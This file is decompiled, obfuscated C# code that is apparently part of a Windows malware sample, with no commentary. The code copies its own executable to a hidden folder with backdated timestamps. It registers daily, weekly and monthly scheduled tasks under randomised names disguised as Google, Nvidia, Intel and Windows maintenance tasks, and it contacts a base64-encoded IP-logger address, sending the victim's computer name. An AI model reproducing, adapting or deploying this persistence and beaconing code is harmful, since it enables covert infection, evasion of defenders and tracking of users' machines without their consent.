using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns10;
using ns14;
using ns21;

namespace ns16;

public class GClass15
{
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private static object object_0;

	public static object ProccessName
	{
		[CompilerGenerated]
		get
		{
			return object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = RuntimeHelpers.GetObjectValue(value);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			if (GClass20.bool_15)
			{
				if (!Operators.ConditionalCompareObjectNotEqual((object)Application.get_ExecutablePath(), GClass20.object_0, false))
				{
					return;
				}
				try
				{
					smethod_1();
					smethod_2(Conversions.ToString(GClass20.object_0));
					smethod_3();
					smethod_4();
					Class0.smethod_30();
					if (Conversions.ToBoolean(GClass20.string_6))
					{
						Class0.smethod_1();
					}
					if (GClass20.mutex_0 != null)
					{
						GClass20.mutex_0.Close();
						GClass20.mutex_0 = null;
					}
					GClass10.smethod_1();
					object[] array;
					bool[] array2;
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", array = new object[1] { GClass20.object_0 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
					if (array2[0])
					{
						GClass20.object_0 = RuntimeHelpers.GetObjectValue(array[0]);
					}
					ProjectData.EndApp();
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			GClass20.object_0 = Application.get_ExecutablePath();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_1()
	{
		try
		{
			if (!Directory.Exists(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9))
			{
				Directory.CreateDirectory(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9);
				Directory.SetCreationTime(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9, GClass20.dateTime_0);
				Directory.SetLastAccessTime(Interaction.Environ(GClass20.string_8) + "\\" + GClass20.string_9, GClass20.dateTime_1);
			}
			else if (File.Exists(Conversions.ToString(GClass20.object_0)))
			{
				File.Delete(Conversions.ToString(GClass20.object_0));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_2(string string_0)
	{
		try
		{
			using (FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
			{
				byte[] array = new byte[(int)(fileStream.Length - 1L) + 1];
				int num = (int)fileStream.Length;
				int num2 = 0;
				while (num > 0)
				{
					int num3 = fileStream.Read(array, num2, num);
					if (num3 == 0)
					{
						break;
					}
					num2 += num3;
					num -= num3;
				}
				num = array.Length;
				using (FileStream fileStream2 = new FileStream(string_0, FileMode.Create, FileAccess.ReadWrite))
				{
					fileStream2.Write(array, 0, num);
					fileStream2.Flush();
					fileStream2.Close();
				}
				fileStream.Flush();
				fileStream.Close();
			}
			Class0.smethod_15(Conversions.ToString(GClass20.object_0));
			Thread.Sleep(5000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_7("ADX"), string.Empty, false) == 0)
			{
				Random random = new Random();
				VBMath.Randomize();
				int num = 1;
				int num2;
				int num3;
				do
				{
					num2 = (int)Conversion.Int(VBMath.Rnd() * (float)num);
					num3 = (int)Conversion.Int(VBMath.Rnd() * (float)num);
					num++;
				}
				while (num <= 31);
				string text = "";
				int num4 = 1;
				do
				{
					text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
					num4++;
				}
				while (num4 <= 8);
				int num5 = random.Next(1, 1440);
				int num6 = random.Next(1, 1440);
				int num7 = random.Next(1, 1440);
				DateTime dateTime = DateTime.Today.AddMinutes(num5);
				DateTime dateTime2 = DateTime.Today.AddMinutes(num6);
				DateTime dateTime3 = DateTime.Today.AddMinutes(num7);
				_ = dateTime.Hour + ":" + dateTime.Minute;
				_ = dateTime2.Hour + ":" + dateTime2.Minute;
				_ = dateTime3.Hour + ":" + dateTime3.Minute;
				string text2 = dateTime.ToString("HH:mm");
				string text3 = dateTime2.ToString("HH:mm");
				string text4 = dateTime3.ToString("HH:mm");
				string[] array = new string[12]
				{
					Conversions.ToString(Class0.smethod_17("eR6mCEyAInWhqHvMBxB6mw==")),
					Conversions.ToString(Class0.smethod_17("FXPxpzW0w4fV39dgJu77Pg==")),
					Conversions.ToString(Class0.smethod_17("4+djJzwCADGVvkjlelENag==")),
					Conversions.ToString(Class0.smethod_17("Y9eW/tit4ki0hVX+Al3n5g==")),
					Conversions.ToString(Class0.smethod_17("vGOtvGQo+Cvd1sRA34BU2A==")),
					Conversions.ToString(Class0.smethod_17("rPLD1LAUXqhfN5ceoyjTfQ==")),
					Conversions.ToString(Class0.smethod_17("KHA2SQUcTlk76GudoIVpDQ==")),
					Conversions.ToString(Class0.smethod_17("nfJcvNaRzG03nP3o/LmWnQ==")),
					Conversions.ToString(Class0.smethod_17("wHxcEaoJMRCwdZR9640u+g==")),
					Conversions.ToString(Class0.smethod_17("TNaJXE5WpuEV3XNx9IjpAg==")),
					Conversions.ToString(Class0.smethod_17("mpgsOUsRjRqAZ6Yh96Y1cQ==")),
					Conversions.ToString(Class0.smethod_17("pnH6FwDALk0wgBSooVf4FQ=="))
				};
				object obj = array[(int)Math.Round(VBMath.Rnd() * (float)(array.Length - 1))];
				string[] array2 = new string[7]
				{
					Conversions.ToString(Class0.smethod_17("S5JTQa/JHatCH+kbEK5oqg==")),
					Conversions.ToString(Class0.smethod_17("xRBvGRffF8zxAu4GAiPdIA==")),
					Conversions.ToString(Class0.smethod_17("krl6ub4N041XoOSnz/244w==")),
					Conversions.ToString(Class0.smethod_17("9r5H4QYXoPbqVKgxQwwhJw==")),
					Conversions.ToString(Class0.smethod_17("WMotRtLDU0Rbjz7ngByclg==")),
					Conversions.ToString(Class0.smethod_17("K/zW145O/xl1bgJnGSE75g==")),
					Conversions.ToString(Class0.smethod_17("5pGxfC74DNbd59bpC/j9dQ=="))
				};
				object obj2 = array2[(int)Math.Round(VBMath.Rnd() * (float)(array2.Length - 1))];
				string text5 = text;
				string[] array3 = new string[38]
				{
					"NvBatteryBoostCheckOnLogon{" + text5 + "}",
					"NvTmRep_CrashReport{" + text5 + "}",
					"User_Feed_Synchronization{" + text5,
					"Intel PTT EK Recertification{" + text5 + "}",
					"NvNode Launcher{" + text5 + "}",
					"GoogleUpdateTaskMachineUA{" + text5 + "}",
					"GoogleUpdateTaskMachineCore{" + text5 + "}",
					"Intel TXE",
					"Intel Platform Trust Technology",
					" TPM 2.0 ",
					"Windows Update",
					"NUC",
					"Security Chip (TPM) Function",
					"ACCAgent",
					"ACCBackgroundApplication",
					"CreateExplorerShellUnelevatedTask",
					"StartComponentCleanup",
					".NET Framework NGEN v4.0.30319 Critical",
					"AD RMS Rights Policy Template Management (Automated)",
					"SmartScreenSpecific",
					"DsSvcCleanup",
					"BitLocker MDM policy Refresh",
					"BgTaskRegistrationMaintenanceTask",
					"Data Integrity Scan for Crash Recovery",
					"RecommendedTroubleshootingScanner",
					"Microsoft-Windows-DiskDiagnosticResolver",
					"StorageCardEncryption Task",
					"ExploitGuard MDM policy Refresh",
					"WakeUpAndScanForUpdates",
					"TempSignedLicenseExchange",
					"WinSAT",
					"MNO Metadata Parser",
					"NetworkStateChangeTask",
					"EnableLicenseAcquisition",
					"UPnPHostConfig",
					"PerformRemediation",
					"sihpostreboot",
					"XblGameSaveTask"
				};
				object obj3 = array3[(int)Math.Round(VBMath.Rnd() * (float)(array3.Length - 1))];
				object obj4 = array3[(int)Math.Round(VBMath.Rnd() * (float)(array3.Length - 1))];
				object obj5 = array3[(int)Math.Round(VBMath.Rnd() * (float)(array3.Length - 1))];
				string[] array4 = new string[51]
				{
					Conversions.ToString(Class0.smethod_24("IK5f++paNZd/HhbInBTUI1qRqLydFSmlKzqueRe5izA=")),
					Conversions.ToString(Class0.smethod_24("ZSVAV1fsMAUsGrdeFT1GfS7p/eVT/QzcNxIIWQEz/00=")),
					Conversions.ToString(Class0.smethod_24("+OowQClrmljn4STWfgTN7jzXZEAd9sAYlOMyDS/wkKU=")),
					Conversions.ToString(Class0.smethod_24("+OowQClrmljn4STWfgTN7jzXZEAd9sAYlOMyDS/wkKU=")),
					Conversions.ToString(Class0.smethod_24("zg1SvLNh6BsrjmMT2lWTpTofOIO3yq78SKfa7H7im0g=")),
					Conversions.ToString(Class0.smethod_24("7b1jeWlu83gJ8IV7LNB0/WL/WavQamzbwrEEqQXfQYg=")),
					Conversions.ToString(Class0.smethod_24("gkguEpCUzoHh1RfqibwBsQVwuJJ0W/8Z1Mv+n9A2AJM=")),
					Conversions.ToString(Class0.smethod_24("fP46axFYKO4aEMDXyZ0gCQ2K+z/E/YnxwRFbssTzePE=")),
					Conversions.ToString(Class0.smethod_24("fP46axFYKO4aEMDXyZ0gCTVeVMRLMhGWHrhjjVm37iI=")),
					Conversions.ToString(Class0.smethod_24("4Mq0I6005aHviERuNSA5NJKmaxtBLzHBOQTEIH2KE9I=")),
					Conversions.ToString(Class0.smethod_24("zg1SvLNh6BsrjmMT2lWTpV/WLFcFt7rzjE8PCgW3k9I=")),
					Conversions.ToString(Class0.smethod_24("ROvCQuIFWnyOQ+X0g/WRy9K7qBegG9ouW5IX+D9N6W0=")),
					Conversions.ToString(Class0.smethod_24("7b1jeWlu83gJ8IV7LNB0/XCNRSuAUmEtPbbG7UofaD8=")),
					Conversions.ToString(Class0.smethod_24("+h5OFBp/QwuxFdjNzjl7XWYjh15SomvTOARW3U6zi1A=")),
					Conversions.ToString(Class0.smethod_24("Ncn705rbMYugvGbpZN0eqox1KE6A4ITtypY8YIoKtMo=")),
					Conversions.ToString(Class0.smethod_24("zg1SvLNh6BsrjmMT2lWTpelmLD9xqRuCm05Fh9zo0WU=")),
					Conversions.ToString(Class0.smethod_24("0dUPwQbjEfDjgtTfrG0HK+ogYRpKGDibwmOyL0FB5UY=")),
					Conversions.ToString(Class0.smethod_24("+h5OFBp/QwuxFdjNzjl7Xd1MP9IWuMu5f1+6y9D9xeU=")),
					Conversions.ToString(Class0.smethod_24("Ncn705rbMYugvGbpZN0eqg9xQ6wywe9pxzmR+ttUAcI=")),
					Conversions.ToString(Class0.smethod_24("fP46axFYKO4aEMDXyZ0gCQJ9FucuDAkgmoaszO5GkWU=")),
					Conversions.ToString(Class0.smethod_24("+h5OFBp/QwuxFdjNzjl7XSvuYJEbN1Q3AyXH8DEG35Q=")),
					Conversions.ToString(Class0.smethod_24("maLGAbCpoBpmbiiSCesdz27IuZZfk0yjyL29P1MRHzA=")),
					Conversions.ToString(Class0.smethod_24("4Mq0I6005aHviERuNSA5NOMyGqQCER4zZ/lR/h7gSos=")),
					Conversions.ToString(Class0.smethod_24("LiQGIi9VpHTuaLRE8f6SjIw8j2mpKRcSHJ5gvitnMcI=")),
					Conversions.ToString(Class0.smethod_24("aK1Zj0de9jVxUOEIe00cHuWRPlIYqPJYjCGciwiN1EU=")),
					Conversions.ToString(Class0.smethod_24("39RRNqFY4+FxzGqVQUCNK32ta7KHLsSRITlSHggfr14=")),
					Conversions.ToString(Class0.smethod_24("jXx3jmXqOfY0aHi2NrEwcaWJtss9dMAz9eEfCJ8Z/zQ=")),
					Conversions.ToString(Class0.smethod_24("yHJZ+wT3FDfYyIBJxDDEPfvhbzVTi4vbf/nYFvUNpeI=")),
					Conversions.ToString(Class0.smethod_24("J3mlbQtrk0y7cF83LV/tTVFvGgHRh43s0un5o0/b8rM=")),
					Conversions.ToString(Class0.smethod_24("345qq7DriOwPXFo8/FSikwOgYhnXUJfQ8n4/v23E/Kw=")),
					Conversions.ToString(Class0.smethod_24("aK1Zj0de9jVxUOEIe00cHsN3Ca4BQxbFdc4v2ZQRSVU=")),
					Conversions.ToString(Class0.smethod_24("345qq7DriOwPXFo8/FSikxvx+LbvJha2tldE5e0nAps=")),
					Conversions.ToString(Class0.smethod_24("jXx3jmXqOfY0aHi2NrEwceOTAU0Ubu1JSm5vzUHpMW0=")),
					Conversions.ToString(Class0.smethod_24("7b1jeWlu83gJ8IV7LNB0/RYieCrppoTvRh9m1uU1lL0=")),
					Conversions.ToString(Class0.smethod_24("7b1jeWlu83gJ8IV7LNB0/bLhHjAzUquaJO6fih+LwzY=")),
					Conversions.ToString(Class0.smethod_24("2/nZy1kXXhWjNXrOp83vt+buwkE9aN7BoyrHsGhtImk=")),
					Conversions.ToString(Class0.smethod_24("ZSVAV1fsMAUsGrdeFT1GfQUBZjUq2YqWvbFfoFWGh4w=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcP08wqElq6Vy/C5Kuqb67tpw=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcPwycapm9E89WFiceoHWTIQk=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcP2Rvo1JSNqdTRbgATSdNYZs=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcPxfsi6CQYz1qlRU1neiLWr4=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcP8L08SnjikpD/b81cLSyE5s=")),
					Conversions.ToString(Class0.smethod_24("vY+JSgkPVHyMVusAaCrcPwwkJURgbsWplem9k1CXjFc=")),
					Conversions.ToString(Class0.smethod_24("7PHhz8uB3uQbbgDGaoVDreQKQqu+zFs1Zm7kORdWs2U=")),
					Conversions.ToString(Class0.smethod_24("7PHhz8uB3uQbbgDGaoVDrUnnM5i5K9jpmmCh9nkM7bM=")),
					Conversions.ToString(Class0.smethod_24("6nyi3xHciepjiJiW2pBKLtI5OiwEq2HldqwmTRgTnEM=")),
					Conversions.ToString(Class0.smethod_24("LiQGIi9VpHTuaLRE8f6SjIw8j2mpKRcSHJ5gvitnMcI=")),
					Conversions.ToString(Class0.smethod_24("39RRNqFY4+FxzGqVQUCNKzcWz0b6Y07nCNOdFQ8Zwwo=")),
					Conversions.ToString(Class0.smethod_24("LiQGIi9VpHTuaLRE8f6SjMP8RmmCMunEHHmYN/SVDQ0=")),
					Conversions.ToString(Class0.smethod_24("6nyi3xHciepjiJiW2pBKLqniu1NsNCb6CzDpLUUx5vg=")),
					Conversions.ToString(Class0.smethod_24("maLGAbCpoBpmbiiSCesdz3itzBSckdvFdbTBkoj+ON4="))
				};
				object obj6 = array4[(int)Math.Round(VBMath.Rnd() * (float)(array4.Length - 1))];
				object obj7 = array4[(int)Math.Round(VBMath.Rnd() * (float)(array4.Length - 1))];
				object obj8 = array4[(int)Math.Round(VBMath.Rnd() * (float)(array4.Length - 1))];
				string text6 = "explorer";
				Random random2 = new Random();
				switch (random2.Next(1, 6))
				{
				case 1:
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text2 + "\" /sc daily /mo \"" + Conversions.ToString(num2) + "\"  /tn  \""), obj3), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj6), (object)"\"")), (AppWinStyle)0, false, -1);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text3 + "\" /sc weekly /mo \"" + Conversions.ToString(num3) + "\"  /d \""), obj2), (object)"\"  /tn  \""), obj4), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj7), (object)"\"")), (AppWinStyle)0, false, -1);
					break;
				case 2:
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text3 + "\" /sc weekly /mo \"" + Conversions.ToString(num3) + "\"  /d \""), obj2), (object)"\"  /tn  \""), obj4), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj7), (object)"\"")), (AppWinStyle)0, false, -1);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text4 + "\" /sc monthly /m \""), obj), (object)"\"  /tn  \""), obj5), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj8), (object)"\"")), (AppWinStyle)0, false, -1);
					break;
				case 3:
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text2 + "\" /sc daily /mo \"" + Conversions.ToString(num2) + "\"  /tn  \""), obj3), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj6), (object)"\"")), (AppWinStyle)0, false, -1);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text4 + "\" /sc monthly /m \""), obj), (object)"\"  /tn  \""), obj5), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj8), (object)"\"")), (AppWinStyle)0, false, -1);
					break;
				case 4:
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text3 + "\" /sc weekly /mo \"" + Conversions.ToString(num3) + "\"  /d \""), obj2), (object)"\"  /tn  \""), obj4), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj7), (object)"\"")), (AppWinStyle)0, false, -1);
					break;
				case 5:
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("cmd /C schtasks /create /f /st \"" + text2 + "\" /sc daily /mo \"" + Conversions.ToString(num2) + "\"  /tn  \""), obj3), (object)"\" /tr \"'"), (object)text6), (object)"'"), obj6), (object)"\"")), (AppWinStyle)0, false, -1);
					break;
				}
				Class0.smethod_8("ADX", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
				smethod_4();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_4()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_7("SLX"), (string)null, false) == 0)
			{
				string requestUriString = Conversions.ToString(Class0.smethod_29("aHR0cHM6Ly9pcGxvZ2dlci5vcmcvMmJkdGU1"));
				string text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", null));
				WebRequest webRequest = WebRequest.Create(requestUriString);
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				string userAgent = text.Split(new char[1] { '-' }).First();
				((HttpWebRequest)webRequest).UserAgent = userAgent;
				webRequest.GetResponse();
				Class0.smethod_8("SLX", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
